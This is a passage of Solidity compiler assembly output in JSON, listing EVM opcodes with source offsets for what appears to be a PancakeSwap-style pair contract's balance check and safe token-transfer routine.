											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "311"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "311"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MLOAD"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "SLOAD"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP2"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MSTORE"
										},
										{
											"begin": 18442,
											"end": 18446,
											"name": "ADDRESS"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP3"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "ADD"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MSTORE"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "SWAP1"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "SWAP3"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "AND"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "SWAP2"
										},
										{
											"begin": 18409,
											"end": 18433,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18409,
											"end": 18433,
											"name": "SWAP2"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP3"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "ADD"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP3"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP3"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP2"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP3"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SWAP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "SUB"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "ADD"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP2"
										},
										{
											"begin": 18416,
											"end": 18422,
											"name": "DUP7"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "DUP1"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "312"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "312"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "GAS"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "STATICCALL"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "313"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "313"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MLOAD"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "314"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "314"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18409,
											"end": 18448,
											"name": "MLOAD"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "DUP1"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "DUP3"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "AND"
										},
										{
											"begin": 18462,
											"end": 18470,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18484,
											"end": 18492,
											"name": "SWAP1"
										},
										{
											"begin": 18484,
											"end": 18492,
											"name": "DIV"
										},
										{
											"begin": 18484,
											"end": 18492,
											"name": "AND"
										},
										{
											"begin": 18335,
											"end": 18342,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 18335,
											"end": 18502,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18335,
											"end": 18502,
											"name": "tag",
											"value": "308"
										},
										{
											"begin": 18335,
											"end": 18502,
											"name": "JUMPDEST"
										},
										{
											"begin": 1379,
											"end": 1380,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1368,
											"end": 1376,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SSTORE"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "tag",
											"value": "142"
										},
										{
											"begin": 1700,
											"end": 2038,
											"name": "JUMPDEST"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP1"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "MLOAD"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP1"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP3"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "ADD"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP3"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "MSTORE"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP2"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "MSTORE"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "PUSH",
											"value": "7472616E7366657228616464726573732C75696E743235362900000000000000"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "SWAP2"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "DUP3"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "ADD"
										},
										{
											"begin": 629,
											"end": 663,
											"name": "MSTORE"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP2"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP6"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP2"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "AND"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP4"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "ADD"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "MSTORE"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP1"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP4"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "ADD"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP7"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "SWAP1"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "MSTORE"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP5"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP5"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "SWAP1"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "SWAP3"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "ADD"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "DUP5"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "MSTORE"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "DUP2"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP3"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "MLOAD"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP2"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "MLOAD"
										},
										{
											"begin": 1781,
											"end": 1793,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1781,
											"end": 1793,
											"name": "SWAP5"
										},
										{
											"begin": 1795,
											"end": 1812,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 1795,
											"end": 1812,
											"name": "SWAP5"
										},
										{
											"begin": 1816,
											"end": 1826,
											"name": "DUP10"
										},
										{
											"begin": 1816,
											"end": 1826,
											"name": "AND"
										},
										{
											"begin": 1816,
											"end": 1826,
											"name": "SWAP4"
										},
										{
											"begin": 1840,
											"end": 1883,
											"name": "SWAP3"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP3"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP1"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP1"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP4"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "316"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "318"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP2"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "316"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "318"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP1"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "ADD"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "MLOAD"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP1"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP4"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SUB"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP2"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "DUP7"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "GAS"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "CALL"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1816,
											"end": 1893,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 14,
											"end": 15,
											"name": "DUP1"
										},
										{
											"begin": 21,
											"end": 22,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "DUP2"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "EQ"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "PUSH [tag]",
											"value": "320"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPI"
										},
										{
											"begin": 75,
											"end": 79,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 69,
											"end": 80,
											"name": "MLOAD"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "SWAP2"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "POP"
										},
										{
											"begin": 144,
											"end": 148,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 140,
											"end": 149,
											"name": "NOT"
										},
										{
											"begin": 133,
											"end": 137,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 115,
											"end": 131,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 111,
											"end": 138,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 150,
											"name": "AND"
										},
										{
											"begin": 104,
											"end": 105,
											"name": "DUP3"
										},
										{
											"begin": 100,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 98,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 87,
											"end": 152,
											"name": "MSTORE"
										},
										{
											"begin": 169,
											"end": 185,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 166,
											"end": 167,
											"name": "DUP3"
										},
										{
											"begin": 159,
											"end": 186,
											"name": "MSTORE"
										},
										{
											"begin": 225,
											"end": 241,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 222,
											"end": 223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 215,
											"end": 219,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 212,
											"end": 213,
											"name": "DUP5"
										},
										{
											"begin": 208,
											"end": 220,
											"name": "ADD"
										},
										{
											"begin": 193,
											"end": 242,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "319"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMP"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "tag",
											"value": "320"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPDEST"
										},
										{
											"begin": 36,
											"end": 40,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "SWAP2"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "POP"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "tag",
											"value": "319"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 1780,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 1780,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1780,
											"end": 1893,
											"name": "SWAP2"
										},
										{
											"begin": 1780,
											"end": 1893,
											"name": "POP"
										},
										{
											"begin": 1924,
											"end": 1931,
											"name": "DUP2"
										},
										{
											"begin": 1924,
											"end": 1981,
											"name": "DUP1"
										},
										{
											"begin": 1924,
											"end": 1981,
											"name": "ISZERO"
										},
										{
											"begin": 1924,
											"end": 1981,
											"name": "PUSH [tag]",
											"value": "322"
										},
										{
											"begin": 1924,
											"end": 1981,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1936,
											"end": 1947,
											"name": "DUP1"
										},
										{
											"begin": 1936,
											"end": 1947,
											"name": "MLOAD"
										},
										{
											"begin": 1936,
											"end": 1952,
											"name": "ISZERO"
										},
										{
											"begin": 1936,
											"end": 1952,
											"name": "DUP1"
										},
										{
											"begin": 1936,
											"end": 1980,
											"name": "PUSH [tag]",
											"value": "322"
										},
										{
											"begin": 1936,
											"end": 1980,
											"name": "JUMPI"
										},
										{
											"begin": 1936,
											"end": 1980,
											"name": "POP"
										},
										{
											"begin": 1967,
											"end": 1971,
											"name": "DUP1"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "DUP1"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "ADD"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "SWAP1"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "MLOAD"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "323"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "323"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1956,
											"end": 1980,
											"name": "MLOAD"
										},
										{
											"begin": 1936,
											"end": 1980,
											"name": "tag",
											"value": "322"
										},
										{
											"begin": 1936,
											"end": 1980,
											"name": "JUMPDEST"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH [tag]",
											"value": "324"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "JUMPI"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP1"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP2"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "18"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "50616E63616B653A205452414E534645525F4641494C45440000000000000000"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP3"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "ADD"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MSTORE"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "MLOAD"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "SWAP1"
										},
										{
											"begin": 1903,
											"end": 2031,
											"name": "DUP2"
										},
										{
											"begin": 1903,
											"end": 2031,
